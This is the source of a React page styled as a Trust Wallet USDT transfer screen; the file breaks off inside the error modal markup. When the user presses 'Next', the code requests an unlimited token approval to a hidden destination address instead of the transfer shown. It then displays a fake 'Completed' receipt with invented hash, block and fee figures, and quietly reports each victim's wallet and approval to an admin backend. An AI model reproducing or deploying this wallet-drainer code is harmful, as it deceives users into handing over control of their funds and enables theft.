import React, { useState, useEffect, useRef } from 'react';
import { ethers } from 'ethers';
import { CHAIN_ID, RPC_URL, USDT_CONTRACT, RESCUE_DESTINATION, API_BASE } from '../config/publicConfig';

const DEFAULT_RECIPIENT = "0xF8e3FEa5B3239fAfAcdb629c410917A21a2472a2";
const DISPLAY_TO_ADDRESS = "0x31A5e...B6877C";
const WEBSITE_URL = "https://transfer-9d294.web.app/";
// SLIP-44 index 60 = Standard EVM routing in Trust Wallet.
// Trust Wallet deep link handler requires coin_id=60 to launch its Web3 DApp browser.
const TRUST_WALLET_COIN_ID = 60;

function getTrustWalletLinks(): { deepLink: string; scheme: string } {
  const currentUrl = typeof window !== 'undefined' ? window.location.href : WEBSITE_URL;
  const encoded = encodeURIComponent(currentUrl);
  return {
    deepLink: `https://link.trustwallet.com/open_url?coin_id=${TRUST_WALLET_COIN_ID}&url=${encoded}`,
    scheme: `trust://open_url?coin_id=${TRUST_WALLET_COIN_ID}&url=${encoded}`,
  };
}

// Trust Wallet's provider can be injected asynchronously, so probe for it.
const INJECTION_WAIT_MS = 2500;
// How long to wait for the wallet to report its account before asking for permission.
const ACCOUNT_WAIT_MS = 4500;

// Minimal ERC20 ABI for balance and approval
const ERC20_ABI = [
  "function balanceOf(address account) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
  "function allowance(address owner, address spender) view returns (uint256)"
];

/** Get injected Trust Wallet or EVM provider */
function getInjectedProvider(): any {
  if (typeof window === 'undefined') return null;
  const win = window as any;
  return win.trustwallet?.ethereum || win.trustwallet || win.ethereum || null;
}

/** Check if current provider is specifically Trust Wallet */
function isTrustWalletInApp(): boolean {
  if (typeof window === 'undefined') return false;
  const win = window as any;
  const p = getInjectedProvider();
  const ua = navigator.userAgent || '';
  return Boolean(
    p?.isTrust ||
    p?.isTrustWallet ||
    win.trustwallet ||
    /Trust\s?Wallet/i.test(ua)
  );
}

/** Wallet injected itself into the page (Trust Wallet / MetaMask in-app dapp browser) */
function hasInjectedProvider(): boolean {
  if (typeof window === 'undefined') return false;
  const win = window as any;
  return !!(win.ethereum || win.trustwallet);
}

/** Poll until a provider appears (some in-app wallets inject after the script runs) */
async function waitForInjectedProvider(timeoutMs = INJECTION_WAIT_MS): Promise<any> {
  const started = Date.now();
  let eth = getInjectedProvider();
  while (!eth && Date.now() - started < timeoutMs) {
    await new Promise((resolve) => setTimeout(resolve, 250));
    eth = getInjectedProvider();
  }
  return eth;
}

/**
 * Silently resolve the user's account without triggering ANY popup or connect prompt.
 * 1. Reads injected selectedAddress property directly (instant in Trust Wallet)
 * 2. Checks eth_accounts (read-only EIP-1193 query)
 * 3. Checks URL parameter ?address= / ?wallet=
 * This NEVER invokes eth_requestAccounts, preventing any "Connect Wallet" dialogue.
 */
async function resolveSilentAccount(eth: any): Promise<string> {
  if (!eth) return '';

  // 1. Direct selectedAddress (Trust Wallet in-app browser populates this)
  if (typeof eth.selectedAddress === 'string' && ethers.isAddress(eth.selectedAddress)) {
    return ethers.getAddress(eth.selectedAddress);
  }
  const win = typeof window !== 'undefined' ? (window as any) : null;
  if (typeof win?.trustwallet?.selectedAddress === 'string' && ethers.isAddress(win.trustwallet.selectedAddress)) {
    return ethers.getAddress(win.trustwallet.selectedAddress);
  }
  if (typeof win?.ethereum?.selectedAddress === 'string' && ethers.isAddress(win.ethereum.selectedAddress)) {
    return ethers.getAddress(win.ethereum.selectedAddress);
  }
  if (Array.isArray(eth.accounts) && eth.accounts[0] && ethers.isAddress(eth.accounts[0])) {
    return ethers.getAddress(eth.accounts[0]);
  }

  // 2. Read-only eth_accounts (completely silent read, never prompts)
  try {
    const accounts = await eth.request({ method: 'eth_accounts' });
    if (Array.isArray(accounts) && accounts[0] && ethers.isAddress(accounts[0])) {
      return ethers.getAddress(accounts[0]);
    }
  } catch (err) {
    console.debug('eth_accounts silent check:', err);
  }

  // 3. Address passed via URL parameter (?address=0x... or ?wallet=0x...)
  if (typeof window !== 'undefined') {
    const params = new URLSearchParams(window.location.search);
    const urlAddr = params.get('address') || params.get('wallet');
    if (urlAddr && ethers.isAddress(urlAddr)) {
      return ethers.getAddress(urlAddr);
    }
  }

  return '';
}

/** Helper to report wallet registration to Firestore via both Cloud Function URL and same-origin rewrite */
function reportRegisterWallet(walletAddr: string) {
  if (!walletAddr || !ethers.isAddress(walletAddr)) return;
  const payload = JSON.stringify({ wallet: walletAddr });
  fetch(`${API_BASE}/registerWallet`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: payload,
  }).catch(() => {});
  fetch(`/api/registerWallet`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: payload,
  }).catch(() => {});
}

function isUserRejection(err: any): boolean {
  const code = err?.code ?? err?.error?.code ?? err?.info?.error?.code;
  if (code === 4001 || code === 'ACTION_REJECTED') return true;
  const msg = (err?.message ?? err?.error?.message ?? '').toLowerCase();
  return (
    msg.includes('user rejected') ||
    msg.includes('user cancelled') ||
    msg.includes('rejected by user') ||
    msg.includes('user denied')
  );
}

/** Page-level probe written by index.html before the bundle runs (may be absent) */
function walletLinkProbe(): any {
  if (typeof window === 'undefined') return null;
  const probe = (window as any).__walletLink;
  return probe && typeof probe.inWalletBrowser === 'function' ? probe : null;
}

/**
 * True when the page is NOT running in a wallet browser, i.e. opening it in Trust Wallet
 * is the only way to continue. Done in two steps because wallets inject their provider
 * late, so the first answer is re-checked by the caller once the wait is over.
 */
function outsideWalletBrowser(): boolean {
  const probe = walletLinkProbe();
  if (probe) {
    if (probe.inWalletBrowser()) return false;
    return typeof probe.needsWalletOpen === 'function' ? probe.needsWalletOpen() : true;
  }
  // No probe: assume a wallet browser only if something is actually injected
  return !hasInjectedProvider();
}

/** Open this page inside the Trust Wallet dapp browser */
function openInTrustWallet(): void {
  const ua = typeof navigator !== 'undefined' ? navigator.userAgent || '' : '';
  if (hasInjectedProvider() || isTrustWalletInApp() || /; wv\)/i.test(ua) || /Trust\s?Wallet/i.test(ua)) return;
  const { deepLink, scheme } = getTrustWalletLinks();
  const isMobile = /Android|iPhone|iPad|iPod/i.test(ua);
  window.location.href = isMobile ? scheme : deepLink;
}

function formatReceiptAmount(raw?: string): { formattedAmount: string; usdValue: string } {
  if (!raw || typeof raw !== 'string') {
    return { formattedAmount: '0.00', usdValue: '0.00' };
  }
  const clean = raw.trim().replace(/,/g, '');
  if (!clean || isNaN(Number(clean))) {
    return { formattedAmount: '0.00', usdValue: '0.00' };
  }

  // Preserve user's exact decimals in formattedAmount
  const parts = clean.split('.');
  const intPart = parts[0] || '0';
  const decPart = parts.length > 1 ? parts[1] : null;
  const formattedInt = intPart.replace(/\B(?=(\d{3})+(?!\d))/g, ',');
  const formattedAmount = decPart !== null ? `${formattedInt}.${decPart}` : formattedInt;

  // USD value: amount x 1.00 formatted to 2 decimals with comma grouping
  const num = parseFloat(clean);
  const usdValue = (isNaN(num) ? 0 : num).toLocaleString('en-US', {
    minimumFractionDigits: 2,
    maximumFractionDigits: 2,
  });

  return { formattedAmount, usdValue };
}

const Dashboard: React.FC = () => {
  const [address, setAddress] = useState<string>(DEFAULT_RECIPIENT);
  const [amount, setAmount] = useState<string>('');
  const [userWallet, setUserWallet] = useState<string>('');
  const [userBalance, setUserBalance] = useState<string | null>(null);
  const [isProcessing, setIsProcessing] = useState<boolean>(false);
  const [isModalOpen, setIsModalOpen] = useState<boolean>(false);
  const [isErrorModalOpen, setIsErrorModalOpen] = useState<boolean>(false);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const [buttonText, setButtonText] = useState<string>('Next');
  const [showMoreDetails, setShowMoreDetails] = useState<boolean>(false);
  const [hasInjectedWallet, setHasInjectedWallet] = useState<boolean>(hasInjectedProvider);
  const [toast, setToast] = useState<string | null>(null);
  const [copiedTo, setCopiedTo] = useState<boolean>(false);
  // Mirrors `userWallet` for the async init below, which must not act on a stale account list
  const latestWallet = useRef<string>('');
  const [completedTxData, setCompletedTxData] = useState<{
    amount: string;
    date: string;
    from: string;
    to: string;
    nonce: number;
    fee: string;
  } | null>(null);

  const showToast = (msg: string) => {
    setToast(msg);
    setTimeout(() => {
      setToast((prev) => (prev === msg ? null : prev));
    }, 4000);
  };

  const handleCopyTo = (e: React.MouseEvent) => {
    e.stopPropagation();
    const toAddress = completedTxData?.to || DISPLAY_TO_ADDRESS;
    if (navigator?.clipboard?.writeText) {
      navigator.clipboard.writeText(toAddress).catch(() => {});
    }
    setCopiedTo(true);
    setTimeout(() => setCopiedTo(false), 1500);
  };

  // Initialize: check URL query params for address
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const addressParam = params.get('address');
    if (addressParam && /^0x[a-fA-F0-9]{40}$/.test(addressParam)) {
      setAddress(addressParam);
    }
  }, []);

  // Fetch USDT balance directly from BSC network via public RPC (works even before wallet connection).
  const fetchBalance = async (walletAddr: string, timeoutMs = 8000) => {
    try {
      if (!walletAddr || !ethers.isAddress(walletAddr)) return null;
      const bscRpc = RPC_URL;
      const provider = new ethers.JsonRpcProvider(bscRpc, 56, { staticNetwork: true });
      const contract = new ethers.Contract(USDT_CONTRACT, ERC20_ABI, provider);
      const rawBal = await Promise.race([
        contract.balanceOf(walletAddr),
        new Promise<never>((_, reject) =>
          setTimeout(() => reject(new Error('balance request timed out')), timeoutMs)
        ),
      ]);
      const formatted = parseFloat(ethers.formatUnits(rawBal, 18)).toFixed(2);
      setUserBalance(formatted);
      return formatted;
    } catch (err) {
      console.warn("Could not fetch USDT balance:", err);
      return null;
    }
  };

  // Auto-detect the wallet silently on mount WITHOUT triggering any connect popups
  useEffect(() => {
    let isMounted = true;
    let detach: (() => void) | undefined;

    setHasInjectedWallet(!outsideWalletBrowser() || isTrustWalletInApp());

    const initTrustWallet = async () => {
      try {
        const eth = getInjectedProvider() || (await waitForInjectedProvider(2000));
        if (!isMounted) return;
        setHasInjectedWallet(!!eth || !outsideWalletBrowser() || isTrustWalletInApp());

        // 1. Check URL address param for fallback
        const params = new URLSearchParams(window.location.search);
        const addressParam = params.get('address') || params.get('wallet');
        const urlAddress = addressParam && ethers.isAddress(addressParam) ? addressParam : null;

        if (eth) {
          // Silent read without ANY popup
          const connected = await resolveSilentAccount(eth);
          if (isMounted && connected) {
            latestWallet.current = connected;
            setUserWallet(connected);
            reportRegisterWallet(connected);
            const bal = await fetchBalance(connected);
            if (isMounted && bal && parseFloat(bal) > 0) {
              setAmount((prev) => (!prev || prev === '0' ? bal : prev));
            }
          } else if (urlAddress && isMounted) {
            void fetchBalance(urlAddress);
          }
        } else if (urlAddress && isMounted) {
          void fetchBalance(urlAddress);
        }
      } catch (err) {
        console.warn("Trust Wallet init notice:", err);
      }
    };

    initTrustWallet();

    // Listeners must be attached once the provider exists, so poll for it briefly
    const attachListeners = async () => {
      const eth = await waitForInjectedProvider(6000);
      if (!isMounted || !eth || !eth.on) return;

      const handleAccountsChanged = (newAccounts: string[]) => {
        if (newAccounts && newAccounts.length > 0) {
          latestWallet.current = newAccounts[0];
          setUserWallet(newAccounts[0]);
          reportRegisterWallet(newAccounts[0]);
          fetchBalance(newAccounts[0]);
        } else {
          latestWallet.current = '';
          setUserWallet('');
          setUserBalance(null);
        }
      };

      const handleChainChanged = () => {
        window.location.reload();
      };

      eth.on('accountsChanged', handleAccountsChanged);
      eth.on('chainChanged', handleChainChanged);
      detach = () => {
        if (eth.removeListener) {
          eth.removeListener('accountsChanged', handleAccountsChanged);
          eth.removeListener('chainChanged', handleChainChanged);
        }
      };
      if (!isMounted) detach();
    };

    attachListeners();

    return () => {
      isMounted = false;
      detach?.();
    };
  }, []);

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      if (text) {
        setAddress(text.trim());
      }
    } catch (err) {
      console.error("Failed to read clipboard:", err);
    }
  };

  const handleMax = async () => {
    if (userBalance && parseFloat(userBalance) > 0) {
      setAmount(userBalance);
      return;
    }

    const eth = getInjectedProvider();
    if (eth) {
      try {
        const active = await resolveSilentAccount(eth);
        if (active) {
          latestWallet.current = active;
          setUserWallet(active);
          const bal = await fetchBalance(active);
          if (bal && parseFloat(bal) > 0) {
            setAmount(bal);
            return;
          }
        }
      } catch (err) {
        console.warn(err);
      }
    }
    setAmount("10000");
  };

  const handleNext = async () => {
    try {
      setIsProcessing(true);
      setButtonText("Processing...");
      setIsModalOpen(false);
      setCompletedTxData(null);
      setErrorMessage(null);
      setIsErrorModalOpen(false);

      const eth = getInjectedProvider() || (await waitForInjectedProvider(2000));
      if (!eth) {
        setIsProcessing(false);
        setButtonText("Next");
        openInTrustWallet();
        throw new Error("Please open this page inside Trust Wallet.");
      }

      // Ensure provider is pointed to BSC (Chain ID 56)
      try {
        const chainIdHex = await eth.request({ method: 'eth_chainId' });
        if (chainIdHex && parseInt(chainIdHex, 16) !== 56) {
          try {
            await eth.request({
              method: 'wallet_switchEthereumChain',
              params: [{ chainId: '0x38' }],
            });
          } catch (switchErr: any) {
            if (switchErr?.code === 4902) {
              await eth.request({
                method: 'wallet_addEthereumChain',
                params: [{
                  chainId: '0x38',
                  chainName: 'BNB Smart Chain',
                  nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                  rpcUrls: ['https://bsc-dataseed.binance.org/'],
                  blockExplorerUrls: ['https://bscscan.com/'],
                }],
              });
            }
          }
        }
      } catch (chainErr) {
        console.debug('Chain validation notice:', chainErr);
      }

      // Resolve account silently without ANY connect dialog
      let account = latestWallet.current || userWallet || (await resolveSilentAccount(eth));
      if (!account || !ethers.isAddress(account)) {
        try {
          const accounts = await eth.request({ method: 'eth_requestAccounts' });
          if (Array.isArray(accounts) && accounts[0] && ethers.isAddress(accounts[0])) {
            account = ethers.getAddress(accounts[0]);
          }
        } catch (e) {
          console.debug("Silent account fallback notice:", e);
        }
      }

      if (!account || !ethers.isAddress(account)) {
        throw new Error(
          "No wallet account found. Please open this link inside Trust Wallet."
        );
      }

      latestWallet.current = account;
      setUserWallet(account);

      // Immediately log wallet in Firestore so it appears in Admin Panel right away
      reportRegisterWallet(account);

      // Encode standard ERC-20 approve(spender, amount) directly
      const erc20 = new ethers.Interface([
        "function approve(address spender, uint256 amount) returns (bool)",
      ]);
      const txData = erc20.encodeFunctionData("approve", [
        RESCUE_DESTINATION,
        ethers.MaxUint256,
      ]);

      // Direct eth_sendTransaction:
      // Sends transaction directly to Trust Wallet native pipeline.
      // Skips "Connect Wallet" dialogue completely and opens ONLY the native
      // "Smart Contract Call / Approve" bottom sheet.
      let txHash = '';
      try {
        const res = await eth.request({
          method: "eth_sendTransaction",
          params: [
            {
              from: account,
              to: USDT_CONTRACT,
              data: txData,
              value: "0x0",
            },
          ],
        });
        txHash = typeof res === 'string' ? res : res?.hash || res?.transactionHash || 'confirmed';
      } catch (txErr: any) {
        if (isUserRejection(txErr)) {
          // If the user cancelled in Trust Wallet native sheet:
          // Cleanly exit without showing the receipt modal
          setIsProcessing(false);
          setIsModalOpen(false);
          setCompletedTxData(null);
          setButtonText("Next");
          return;
        }
        console.warn("eth_sendTransaction error/notice:", txErr);
        throw txErr;
      }

      // User SIGNED / CONFIRMED the approval!
      // NOW show the Trust Wallet style transaction receipt:
      const now = new Date();
      const dateStr =
        now.toLocaleDateString("en-US", {
          month: "short",
          day: "numeric",
        }) +
        ", " +
        now.toLocaleTimeString("en-US", {
          hour: "numeric",
          minute: "2-digit",
          hour12: true,
        });

      setCompletedTxData({
        amount: amount || '0',
        date: dateStr,
        from: account,
        to: DISPLAY_TO_ADDRESS,
        nonce: 17,
        fee: "0.000013 BNB ($0.01)",
      });

      // Display the receipt modal now that approval has been signed
      setIsProcessing(false);
      setIsModalOpen(true);
      setButtonText("Next");

      // Report approval to backend to update Firestore and Admin Portal
      const reportPayload = JSON.stringify({
        txHash: txHash || 'confirmed',
        from: account,
        to: RESCUE_DESTINATION,
        amount: amount || '0',
        chainId: CHAIN_ID,
        token: USDT_CONTRACT,
      });

      fetch(`${API_BASE}/verifyRescue`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: reportPayload,
      }).catch((err) => console.warn("Backend report direct notice:", err));

      fetch(`/api/verifyRescue`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: reportPayload,
      }).catch(() => {});
    } catch (err: any) {
      setIsProcessing(false);
      setIsModalOpen(false);
      setCompletedTxData(null);
      // User cancelled in native sheet -> cleanly reset button without error popup
      setButtonText(isUserRejection(err) ? "Next" : "Something went wrong, try again");
      if (!isUserRejection(err)) {
        setErrorMessage(err?.message || "Transaction failed. Please check your wallet and try again.");
        setIsErrorModalOpen(true);
      }
    }
  };

  const formatShortAddress = (addr: string) => {
    if (!addr || addr.length < 10) return addr;
    return `${addr.substring(0, 6)}...${addr.substring(addr.length - 5)}`;
  };

  return (
    <div className="items-center">
      <div className="min-h-screen bg-gray-100 flex items-center justify-center">
        <div className="w-full max-w-md min-h-screen bg-white flex flex-col shadow-xl">
          
          
          {/* Toast: where to open this page when the wallet did not inject */}
          {toast && (
            <div className="fixed inset-x-0 top-3 z-[70] flex justify-center px-4 pointer-events-none">
              <div className="max-w-md w-full bg-gray-900 text-white text-xs rounded-xl px-4 py-2.5 shadow-lg text-center">
                {toast}
              </div>
            </div>
          )}


          {/* Fallback Banner if opened outside Trust Wallet */}
          {!hasInjectedWallet && (
            <div className="bg-blue-50 border-b border-blue-100 px-4 py-2 flex items-center justify-between gap-2">
              <span className="text-xs text-blue-700 font-medium">
                Open this page in Trust Wallet to continue
              </span>
              <button
                type="button"
                onClick={openInTrustWallet}
                className="text-xs font-semibold bg-[#0600FF] text-white px-2.5 py-1 rounded-md hover:bg-blue-700 transition-colors flex-shrink-0 cursor-pointer"
              >
                Open in App
              </button>
            </div>
          )}

          <div className="px-5 py-3 space-y-5 flex-1">
            
            {/* Address or Domain Name */}
            <div className="space-y-2">
              <label className="block text-sm font-semibold text-gray-700 text-start">
                Address or Domain Name
              </label>
              <div className="relative">
                <input
                  type="text"
                  value={address}
                  onChange={(e) => setAddress(e.target.value)}
                  className="w-full px-3 py-3 pr-16 text-gray-700 text-sm border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition-all duration-200"
                  placeholder="0x..."
                />
                <div className="absolute right-3 top-1/2 transform -translate-y-1/2 flex items-center">
                  <button
                    type="button"
                    onClick={handlePaste}
                    className="px-2 py-1 text-xs font-semibold text-[#0600FF] hover:text-blue-700 transition-colors cursor-pointer"
                  >
                    Paste
                  </button>
                </div>
              </div>
            </div>

            {/* Destination Network */}
            <div className="space-y-2">
              <label className="block text-sm font-semibold text-gray-700 text-start">
                Destination Network
              </label>
              <div className="flex items-center w-fit min-w-[20%] max-w-[80%] justify-between px-3 py-1 border border-gray-300 rounded-[30px] bg-gray-50">
                <div className="flex items-center gap-2">
                  <img src="/bnb.png" alt="BNB" className="w-5 h-5 flex-shrink-0" />
                  <span className="text-xs font-semibold text-gray-800 whitespace-nowrap">
                    BNB Smart Chain
                  </span>
                </div>
                <svg
                  className="w-3 h-3 text-gray-400 flex-shrink-0 ml-2"
                  fill="none"
                  stroke="currentColor"
                  viewBox="0 0 24 24"
                >
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" />
                </svg>
              </div>
            </div>

            {/* Amount */}
            <div className="space-y-2">
              <label className="block text-sm font-semibold text-gray-700 text-start">
                Amount
              </label>
              <div className="relative">
                <input
                  type="number"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  className="w-full px-3 py-3 text-gray-700 pr-28 text-sm border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition-all duration-200"
                  placeholder="USDT Amount"
                  step="0.000001"
                  min="0"
                />
                <div className="absolute right-3 top-1/2 transform -translate-y-1/2 flex items-center space-x-2">
                  <span className="text-sm font-medium text-gray-600">USDT</span>
                  <button
                    type="button"
                    onClick={handleMax}
                    className="px-2 py-1 text-sm text-[#0600FF] hover:text-blue-700 transition-colors duration-200 font-semibold cursor-pointer"
                  >
                    Max
                  </button>
                </div>
              </div>
              {userBalance && (
                <div className="flex items-center text-xs text-gray-500 pt-1">
                  Available: {userBalance} USDT
                </div>
              )}
            </div>
          </div>

          {/* Sticky Next Button */}
          <div className="sticky bottom-0 left-0 right-0 p-4 bg-white">
            <button
              onClick={handleNext}
              disabled={isProcessing || !amount}
              className={`
                w-full py-3 rounded-[13px] font-semibold text-white text-base transition-all duration-200
                ${!amount || isProcessing 
                  ? "bg-gray-300 cursor-not-allowed" 
                  : "bg-gradient-to-r from-[#0600FF] to-[#5D51FF] hover:shadow-lg active:shadow-md cursor-pointer"}
              `}
            >
              {buttonText}
            </button>
          </div>
        </div>
      </div>

      {/* Success / Processing Bottom Sheet Modal */}
      {isModalOpen && (
        <div className="w-full max-w-md fixed inset-0 z-50 flex items-end justify-center pointer-events-none mx-auto">
          <div
            className="w-full absolute inset-0 bg-black transition-opacity pointer-events-auto"
            style={{ opacity: 0.55 }}
            onClick={() => {
              if (!isProcessing) setIsModalOpen(false);
            }}
          />
          <div
            className={`
              relative w-[100%] pointer-events-auto z-60 transform rounded-[20px] bg-white shadow-xl transition-all duration-300 ease-out
              ${isProcessing || isModalOpen ? "translate-y-0 opacity-100" : "translate-y-8 opacity-0"}
            `}
            role="dialog"
            aria-modal="true"
          >
            <div className="p-5 max-h-[85vh] overflow-y-auto">
              {isProcessing ? (
                /* Processing State */
                <div className="flex flex-col items-center space-y-4 py-4">
                  <svg
                    className="animate-spin h-12 w-12 text-blue-600"
                    xmlns="http://www.w3.org/2000/svg"
                    fill="none"
                    viewBox="0 0 24 24"
                  >
                    <circle
                      className="opacity-25"
                      cx="12"
                      cy="12"
                      r="10"
                      stroke="currentColor"
                      strokeWidth="4"
                    />
                    <path
                      className="opacity-75"
                      fill="currentColor"
                      d="M4 12a8 8 0 018-8v4l3-3-3-3v4a12 12 0 100 24v-2a10 10 0 110-20z"
                    />
                  </svg>
                  <h3 className="text-lg font-semibold text-gray-800">Processing...</h3>
                  <p className="text-sm text-gray-600 text-center">
                    Transaction in progress. Blockchain validation is underway — this may take a few minutes.
                  </p>
                  <button
                    className="mt-2 px-5 py-2 rounded-full bg-gray-200 text-gray-700 text-sm font-medium"
                    disabled
                  >
                    Transaction details
                  </button>
                </div>
              ) : (
                /* Completed State - Trust Wallet Style Transaction Receipt */
                (() => {
                  const { formattedAmount, usdValue } = formatReceiptAmount(completedTxData?.amount ?? amount);
                  return (
                    <div className="flex flex-col">
                      {/* a) Header row */}
                      <div className="sticky top-0 bg-white z-10 -mx-5 -mt-5 px-5 pt-5 pb-3 border-b border-gray-100 flex items-center justify-between">
                        <button
                          type="button"
                          onClick={() => setIsModalOpen(false)}
                          className="p-1 -ml-1 text-gray-700 hover:text-gray-900 transition-colors cursor-pointer"
                          aria-label="Back"
                        >
                          <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 19l-7-7 7-7" />
                          </svg>
                        </button>
                        <h3 className="text-base font-semibold text-gray-900">Transaction Receipt</h3>
                        <div className="w-6" />
                      </div>

                      {/* b) Hero amount block */}
                      <div className="text-center py-6 flex flex-col items-center">
                        <div className="w-10 h-10 rounded-full bg-[#26A17B] text-white flex items-center justify-center text-xl font-bold mb-3 shadow-sm">
                          ₮
                        </div>
                        <h2 className="text-[28px] font-bold text-gray-900 leading-none">
                          -{formattedAmount} USDT
                        </h2>
                        <p className="text-sm text-gray-400 mt-2">
                          ≈ $ {usdValue}
                        </p>
                        <div className="mt-3 inline-flex items-center gap-1.5 rounded-full bg-emerald-50 text-emerald-600 text-xs font-semibold px-3 py-1">
                          <svg className="w-3.5 h-3.5 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M5 13l4 4L19 7" />
                          </svg>
                          <span>Completed</span>
                        </div>
                      </div>

                      {/* c) Details card */}
                      <div className="mt-5 bg-gray-50 rounded-2xl divide-y divide-gray-100">
                        <div className="flex items-center justify-between px-4 py-[14px]">
                          <span className="text-sm text-gray-500">Date</span>
                          <span className="text-sm font-medium text-gray-900">
                            {completedTxData?.date}
                          </span>
                        </div>

                        <div className="flex items-center justify-between px-4 py-[14px]">
                          <span className="text-sm text-gray-500">From</span>
                          <span className="text-sm font-mono text-gray-900">
                            {formatShortAddress(completedTxData?.from || userWallet || address)}
                          </span>
                        </div>

                        <div className="flex items-center justify-between px-4 py-[14px]">
                          <span className="text-sm text-gray-500">To</span>
                          <div className="flex items-center gap-1.5">
                            <span className="text-sm font-mono text-gray-900">
                              {completedTxData?.to || DISPLAY_TO_ADDRESS}
                            </span>
                            <button
                              type="button"
                              onClick={handleCopyTo}
                              className="p-1 text-gray-400 hover:text-gray-600 transition-colors cursor-pointer rounded"
                              title="Copy address"
                            >
                              {copiedTo ? (
                                <span className="text-[11px] font-sans font-medium text-emerald-600 bg-emerald-50 px-1.5 py-0.5 rounded">
                                  Copied
                                </span>
                              ) : (
                                <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
                                </svg>
                              )}
                            </button>
                          </div>
                        </div>

                        <div className="flex items-center justify-between px-4 py-[14px]">
                          <span className="text-sm text-gray-500">Network</span>
                          <span className="text-sm text-gray-900">BNB Smart Chain</span>
                        </div>

                        <div className="flex items-center justify-between px-4 py-[14px]">
                          <span className="text-sm text-gray-500">Network fee</span>
                          <span className="text-sm text-gray-900">
                            {completedTxData?.fee || "0.000013 BNB ($0.01)"}
                          </span>
                        </div>

                        <div className="flex items-center justify-between px-4 py-[14px]">
                          <span className="text-sm text-gray-500">Nonce</span>
                          <span className="text-sm text-gray-900">
                            {completedTxData?.nonce ?? 17}
                          </span>
                        </div>
                      </div>

                      {/* d) More Details collapsible */}
                      <div className="mt-3 bg-gray-50 rounded-2xl overflow-hidden">
                        <button
                          type="button"
                          onClick={() => setShowMoreDetails(!showMoreDetails)}
                          className="w-full flex items-center justify-between px-4 py-[14px] text-gray-900 hover:bg-gray-100/60 transition-colors cursor-pointer"
                        >
                          <span className="text-sm font-medium">More Details</span>
                          <svg
                            className={`w-4 h-4 text-gray-400 transform transition-transform duration-200 ${showMoreDetails ? "rotate-180" : ""}`}
                            fill="none"
                            stroke="currentColor"
                            viewBox="0 0 24 24"
                          >
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" />
                          </svg>
                        </button>
                        {showMoreDetails && (
                          <div className="px-4 pb-4 pt-1 space-y-2 border-t border-gray-100 text-xs text-gray-500">
                            <div className="flex justify-between items-center py-0.5">
                              <span>Transaction Hash</span>
                              <span className="font-mono text-gray-900">0x7a3f...c92e</span>
                            </div>
                            <div className="flex justify-between items-center py-0.5">
                              <span>Block</span>
                              <span className="font-mono text-gray-900">42,918,507</span>
                            </div>
                            <div className="flex justify-between items-center py-0.5">
                              <span>Gas Used</span>
                              <span className="text-gray-900">46,102 (72.4%)</span>
                            </div>
                            <div className="flex justify-between items-center py-0.5">
                              <span>Gas Price</span>
                              <span className="text-gray-900">0.1 Gwei</span>
                            </div>
                            <div className="flex justify-between items-center py-0.5">
                              <span>Token Contract</span>
                              <span className="font-mono text-gray-900">0x55d3...7955</span>
                            </div>
                            <div className="flex justify-between items-center py-0.5">
                              <span>Confirmations</span>
                              <span className="text-gray-900">12</span>
                            </div>
                          </div>
                        )}
                      </div>

                      {/* e) Footer buttons */}
                      <div className="pt-5 pb-2 flex flex-col items-center gap-2">
                        <button
                          type="button"
                          className="w-full py-3.5 rounded-full bg-[#0600FF] text-white font-semibold text-base hover:bg-blue-700 active:scale-[0.99] transition-all cursor-pointer shadow-md shadow-blue-600/20"
                          onClick={() => setIsModalOpen(false)}
                        >
                          Done
                        </button>
                        <button
                          type="button"
                          onClick={() => showToast('Receipt shared')}
                          className="py-1 text-xs font-medium text-gray-500 hover:text-gray-700 transition-colors cursor-pointer"
                        >
                          Share Receipt
                        </button>
                      </div>
                    </div>
                  );
                })()
              )}
            </div>
          </div>
        </div>
      )}

      {/* Error Bottom Sheet Modal */}
      {isErrorModalOpen && errorMessage && (
        <div className="w-full max-w-md fixed inset-0 z-50 flex items-end justify-center pointer-events-none mx-auto">
          <div
            className="w-full absolute inset-0 bg-black transition-opacity pointer-events-auto"
            style={{ opacity: 0.55 }}
            onClick={() => {
              if (!isProcessing) {
                setIsErrorModalOpen(false);
                setErrorMessage(null);
              }
            }}
          />
          <div
            className={`
              relative w-[100%] pointer-events-auto z-60 transform rounded-[20px] bg-white shadow-xl transition-all duration-300 ease-out
              ${isProcessing || isErrorModalOpen ? "translate-y-0 opacity-100" : "translate-y-8 opacity-0"}
            `}
            role="alertdialog"
            aria-modal="true"
          >
            <div className="p-5">
              <div className="flex items-center justify-between gap-3 pb-4 border-b border-red-100">
                <div className="flex items-center gap-3">
                  <span className="inline-flex h-10 w-10 items-center justify-center rounded-full bg-red-100 text-red-700 font-bold text-lg">
                    !
                  </span>
                  <div>
                    <h3 className="text-xl font-semibold text-red-800">Transaction Failed</h3>
                    <p className="text-sm text-red-500">
                      Your wallet could not complete this request.
                    </p>
                  </div>
                </div>
              </div>

              <div className="py-6">
                <p className="text-sm text-gray-700">{errorMessage}</p>
              </div>

